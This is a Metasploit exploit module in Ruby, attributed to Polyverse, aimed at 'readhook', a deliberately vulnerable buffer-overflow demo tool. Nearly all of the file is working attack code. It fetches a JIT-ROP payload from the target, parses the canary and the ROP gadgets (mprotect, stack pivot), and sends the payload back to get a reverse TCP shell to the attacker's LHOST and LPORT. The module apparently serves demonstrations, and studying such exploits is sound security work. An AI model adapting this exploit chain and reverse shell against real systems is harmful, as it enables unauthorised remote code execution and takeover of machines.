class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::HttpClient

    module Target
        Linux = 0 # Generic Linux
    end

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'           => 'readhook',
                'Description'    => 'Exploit for readhook synthetic buffer overflow tool',
                'Author'         => [ 'Polyverse Corporation' ],
                'License'        => MSF_LICENSE,
                'References'     => [ [ 'URL', 'https://polyverse.com' ], ],
                'Platform'       => [ 'linux' ],
                'Payload'        => { },
                'Arch'           => [ ARCH_X64 ],
                'Targets'        => [ [ 'Linux x64', { 'Arch' => ARCH_X64, } ] ],
                'DefaultTarget'  => Target::Linux,
                'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/shell_reverse_tcp' }
            )
        )

        register_options(
        [
            Opt::LPORT(5555),
            Opt::RPORT(8080),
            OptString.new('READHOOK_BASE_URI', [true, 'The base path for READHOOK magic.', '/xyzzy']),
            OptBool.new('INTERACTIVE', [false, 'Interactive mode for live audiences and video generation.', false])
        ], self.class)
    end

    # Endian-sensitive string-to-integer converter
    def str_to_int(str)
        if str.length > 8
            return nil
        end

        n = 0
        for i in 1..str.length
            if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
                n = (n << 8) + str[str.length - i].ord
            else
                n = (n << 8) + str[i - 1].ord
            end
        end

        return n
    end

    # Formatter for int to hex string
    def int_to_str16(i)
        return "0x" + i.to_s(16)
    end

    # Formatter for binary string to hex string
    def str_to_str16(str)
        return str.unpack('H*')
    end

    # Returns that the remote host is always vulnerable
    def check
        return Exploit::CheckCode::Vulnerable
    end

    def exploit
        # Print utility for a header
        def print_header(hdr)
            print_status("-------------------------------------------------------------------")
            print_status("#{hdr}")
            print_status("-------------------------------------------------------------------")
        end

        # Print utility for a separator
        def print_separator()
            print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
        end

        def interact(step, action)
            print_status()
            print_status("STEP #{step}: #{datastore['INTERACTIVE'] ? "Press <Enter>" : "Proceed"} to: #{action}")
            if datastore['INTERACTIVE']
                c = gets[0].chomp().downcase()
                exit() if c == 'q'
                return step if c == 'r'
            end

            return step + 1
        end

        # Check for vulnerability
        def checktarget(step)
            begin
                nextstep = interact(step, "Check if target is vulnerable.")
                exit() if check() != Exploit::CheckCode::Vulnerable
            end while nextstep == step

            return nextstep
        end

        # Ask READHOOK for a payload that will give us a reverse shell from the remote host
        def getpayload(step)
            begin
                nextstep = interact(step, "Request JITROP Payload.")
                uri = datastore['READHOOK_BASE_URI'] + "MAKEJROP" + datastore['LHOST'] + ':' + datastore['LPORT'].to_s(10)
                res = send_request_cgi( { 'method' => 'GET', 'uri' => uri } )
                exit() if !res || res.code != 200
                
                raw=res.body

                encoded = raw[datastore['READHOOK_BASE_URI'].length() + "OVERFLOW".length()..-1]
            end while nextstep == step

#           print_status("raw: #{raw} (Length: #{raw.length})")

            return nextstep, raw
        end

        # Given the response from readhook(), extract the bas64 encoded portion of the reply
        def getencoded(step, raw)
            begin
                nextstep = interact(step, "Extract the base64 encoded portion of the payload.")
                encoded = raw[datastore['READHOOK_BASE_URI'].length() + "OVERFLOW".length()..-1]
            end while nextstep == step

#           print_status("encoded: #{encoded} (Length: #{encoded.length})")

            return nextstep, encoded
        end

        # Given the base64 encoded payload, decode it
        def decode(step, encoded)
            begin
                nextstep = interact(step, "Decode the base64 encoded portion of the payload.")
                decoded = Rex::Text.decode_base64(encoded)
            end while nextstep == step

#           print_status("decoded: #{decoded} (Length: #{decoded.length})")

            return nextstep, decoded 
        end

        # Given the decoded payload, parse it into a friendly format
        def parse(step, decoded)
            begin
                nextstep = interact(step, "Parse the decoded payload into a friendly format.")

                parsed = Hash.new
                parsed["sf_dst"]        = str_to_int(decoded[0..7])
                parsed["sf_canary"]     = str_to_int(decoded[8..15])
                parsed["sf_rbp"]        = str_to_int(decoded[16..23])
                parsed["rc_popRDI"]     = str_to_int(decoded[24..31])
                parsed["rc_stackPage"]  = str_to_int(decoded[32..39])
                parsed["rc_popRSI"]     = str_to_int(decoded[40..47])
                parsed["rc_stackSize"]  = str_to_int(decoded[48..55])
                parsed["rc_popRDX"]     = str_to_int(decoded[56..63])
                parsed["rc_permission"] = str_to_int(decoded[64..71])
                parsed["rc_nopNOP"]     = str_to_int(decoded[72..79])
                parsed["rc_mprotect"]   = str_to_int(decoded[80..87])
                parsed["rc_pivot"]      = str_to_int(decoded[88..94])
                parsed["pl_scu"]        =            decoded[95..-1]
            end while nextstep == step

            parsed.each do |key, value|
                if key == "pl_scu" then
                    puts "%16s: %s" % [key, value]
                else
                    puts "%16s: 0x%016x" % [key, value]
                end
            end

#           print_status("parsed: #{parsed} (Length: #{parsed.length})")

            return nextstep, parsed
        end

        def dumppayload(step, payload)
            step = interact(step, "Ask readhook to dump the payload...")
            res = send_request_cgi( { 'method' => 'GET', 'uri' => payload.gsub("OVERFLOW", "DUMPLOAD") } )

            return step
        end

        def showpayload(step, payload)
            step = interact(step, "Show the payload from readhook")
            print_status(payload)

           return step
        end

        def putpayload(step, payload)
            step = interact(step, "Send JITROP payload back to server...")
            res = send_request_cgi( { 'method' => 'GET', 'uri' => payload } )

            return step
        end

        print_status("Start...")

        step          = checktarget(1)
        step, raw     = getpayload(step)
        step, encoded = getencoded(step, raw)
        step, decoded = decode(step, encoded)
        step, parsed  = parse(step, decoded)
        step          = putpayload(step, raw)
 
        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
